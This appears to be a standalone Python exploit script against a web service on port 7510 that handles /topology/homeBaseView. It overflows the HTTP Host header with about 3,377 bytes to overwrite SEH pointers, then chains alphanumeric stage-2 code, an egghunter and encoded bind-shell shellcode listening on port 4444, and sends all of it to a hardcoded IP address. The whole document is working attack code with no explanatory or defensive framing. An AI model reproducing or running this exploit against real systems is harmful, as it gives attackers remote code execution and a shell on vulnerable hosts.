#!/usr/bin/python

import socket
import os
import sys

SEH = "\x6f\x22\x44\x44"
nSEH =  "\x41\x41\x75\x08"

Stage2 = ( "\x47"*4 + # Padding for the above conditional jump
"\x25\x4a\x4d\x4e\x55"# 25 4A4D4E55      AND EAX,554E4D4A
"\x25\x35\x32\x31\x2a"# 25 3532312A      AND EAX,2A313235
"\x54"	 	      #54               PUSH ESP
"\x58"                #58               POP EAX
"\x2d\x66\x7f\x55\x55"#2D 667F5555      SUB EAX,55557F66
"\x2d\x68\x61\x55\x55"#2D 68615555      SUB EAX,55556168
"\x2d\x5e\x01\x54\x55"#2D 5E015455      SUB EAX,5554015E
"\x50"		      #50               PUSH EAX
"\x5c" 		      #5C               POP ESP
)

#NTSysAlarm Egghunter 32bytes encoded in ascii by manipulating EAX and pushing it on the stack
EggHunter = ("\x47" * 4 +
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x55\x55\x2d\x01\x55\x55\x60\x2d\x35\x6e\x55\x62\x50"
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x55\x55\x55\x2d\x7e\x01\x55\x7f\x2d\x7e\x33\x6b\x7b\x50" 
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x01\x55\x7f\x55\x2d\x7a\x01\x7f\x55\x2d\x55\x35\x76\x5a\x50" 
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x55\x7f\x7f\x55\x2d\x55\x7f\x01\x55\x2d\x67\x48\x0c\x25\x50"
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x55\x7f\x7f\x2d\x42\x55\x20\x01\x2d\x03\x50\x06\x0b\x50" 
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x39\x01\x62\x2d\x53\x06\x05\x5f\x2d\x2c\x68\x2c\x10\x50" 
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x7f\x01\x01\x2d\x30\x05\x5f\x4e\x2d\x42\x39\x4d\x46\x50" 
"\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x7f\x7c\x7f\x55\x2d\x1a\x01\x55\x55\x2d\x01\x01\x61\x55\x50" 
)

#Bind on  4444
Shellcode = ("r00tr00t" +
"\x89\xe2\xdb\xc2\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49\x49"
"\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a"
"\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32"
"\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
"\x59\x6c\x4b\x58\x6f\x79\x37\x70\x35\x50\x77\x70\x75\x30\x4e"
"\x69\x6a\x45\x44\x71\x4e\x32\x45\x34\x6e\x6b\x53\x62\x64\x70"
"\x4e\x6b\x31\x42\x74\x4c\x6e\x6b\x73\x62\x67\x64\x6e\x6b\x44"
"\x32\x54\x68\x34\x4f\x4c\x77\x33\x7a\x76\x46\x35\x61\x39\x6f"
"\x70\x31\x39\x50\x6e\x4c\x55\x6c\x50\x61\x61\x6c\x73\x32\x44"
"\x6c\x67\x50\x6f\x31\x38\x4f\x66\x6d\x75\x51\x58\x47\x68\x62"
"\x58\x70\x43\x62\x51\x47\x4c\x4b\x30\x52\x32\x30\x6e\x6b\x51"
"\x52\x77\x4c\x56\x61\x78\x50\x6c\x4b\x37\x30\x44\x38\x4e\x65"
"\x4b\x70\x62\x54\x51\x5a\x75\x51\x6e\x30\x50\x50\x6c\x4b\x63"
"\x78\x54\x58\x6e\x6b\x61\x48\x37\x50\x73\x31\x49\x43\x4b\x53"
"\x65\x6c\x33\x79\x4c\x4b\x64\x74\x6e\x6b\x63\x31\x6a\x76\x76"
"\x51\x59\x6f\x74\x71\x39\x50\x4c\x6c\x6b\x71\x78\x4f\x76\x6d"
"\x37\x71\x7a\x67\x65\x68\x79\x70\x32\x55\x4a\x54\x37\x73\x71"
"\x6d\x58\x78\x35\x6b\x61\x6d\x66\x44\x30\x75\x39\x72\x71\x48"
"\x4e\x6b\x62\x78\x51\x34\x77\x71\x5a\x73\x72\x46\x4e\x6b\x66"
"\x6c\x42\x6b\x6e\x6b\x46\x38\x55\x4c\x66\x61\x69\x43\x4c\x4b"
"\x57\x74\x6c\x4b\x63\x31\x38\x50\x6c\x49\x42\x64\x71\x34\x65"
"\x74\x31\x4b\x31\x4b\x75\x31\x36\x39\x32\x7a\x42\x71\x49\x6f"
"\x69\x70\x72\x78\x53\x6f\x63\x6a\x6e\x6b\x52\x32\x4a\x4b\x6f"
"\x76\x51\x4d\x43\x58\x30\x33\x64\x72\x63\x30\x33\x30\x71\x78"
"\x33\x47\x30\x73\x55\x62\x53\x6f\x52\x74\x53\x58\x32\x6c\x54"
"\x37\x64\x66\x65\x57\x49\x6f\x58\x55\x4e\x58\x4c\x50\x33\x31"
"\x47\x70\x45\x50\x54\x69\x6f\x34\x61\x44\x36\x30\x42\x48\x75"
"\x79\x6d\x50\x30\x6b\x73\x30\x39\x6f\x58\x55\x70\x50\x76\x30"
"\x72\x70\x72\x70\x71\x50\x70\x50\x43\x70\x30\x50\x53\x58\x78"
"\x6a\x34\x4f\x39\x4f\x59\x70\x6b\x4f\x6a\x75\x6c\x49\x49\x57"
"\x46\x51\x4b\x6b\x56\x33\x51\x78\x33\x32\x35\x50\x37\x61\x31"
"\x4c\x6b\x39\x5a\x46\x73\x5a\x54\x50\x42\x76\x56\x37\x35\x38"
"\x6f\x32\x39\x4b\x76\x57\x65\x37\x79\x6f\x6a\x75\x46\x33\x32"
"\x77\x62\x48\x6e\x57\x79\x79\x64\x78\x6b\x4f\x6b\x4f\x78\x55"
"\x52\x73\x32\x73\x66\x37\x51\x78\x71\x64\x78\x6c\x45\x6b\x38"
"\x61\x79\x6f\x6b\x65\x42\x77\x4f\x79\x5a\x67\x71\x78\x70\x75"
"\x72\x4e\x42\x6d\x50\x61\x69\x6f\x7a\x75\x31\x78\x73\x53\x42"
"\x4d\x52\x44\x73\x30\x4f\x79\x4d\x33\x50\x57\x71\x47\x32\x77"
"\x54\x71\x58\x76\x42\x4a\x74\x52\x32\x79\x61\x46\x4d\x32\x49"
"\x6d\x51\x76\x4b\x77\x53\x74\x61\x34\x37\x4c\x46\x61\x45\x51"
"\x6e\x6d\x63\x74\x61\x34\x74\x50\x4f\x36\x53\x30\x71\x54\x52"
"\x74\x56\x30\x36\x36\x56\x36\x61\x46\x57\x36\x43\x66\x70\x4e"
"\x70\x56\x62\x76\x31\x43\x33\x66\x65\x38\x52\x59\x38\x4c\x37"
"\x4f\x4e\x66\x4b\x4f\x5a\x75\x4e\x69\x59\x70\x32\x6e\x61\x46"
"\x71\x56\x39\x6f\x30\x30\x51\x78\x56\x68\x6e\x67\x67\x6d\x63"
"\x50\x39\x6f\x6b\x65\x6f\x4b\x4a\x50\x6f\x45\x49\x32\x32\x76"
"\x55\x38\x6c\x66\x5a\x35\x4f\x4d\x4d\x4d\x49\x6f\x39\x45\x55"
"\x6c\x44\x46\x51\x6c\x57\x7a\x6f\x70\x4b\x4b\x4d\x30\x63\x45"
"\x46\x65\x4f\x4b\x62\x67\x77\x63\x30\x72\x30\x6f\x50\x6a\x77"
"\x70\x72\x73\x59\x6f\x6a\x75\x41\x41"
)
#SEH offset 3381
#End of stack: 3833

crash = "A" * 3377 + nSEH + SEH + Stage2 + EggHunter + "\x47" * (422 - len(Stage2+EggHunter))#original 452

buffer  ="GET /topology/homeBaseView HTTP/1.1 \r\n" 
buffer +="Host: " + crash + "\r\n"
buffer +="Content-type: application/x-www-form-urlencoded  \r\n"
buffer +="User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03"
buffer +="Content-Length:  1048580 \r\n\r\n"
buffer +=Shellcode
#buffer += Shellcode + "\xcc" *(1300-len(Shellcode))

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.100.182", 7510))
expl.send(buffer)
expl.close()
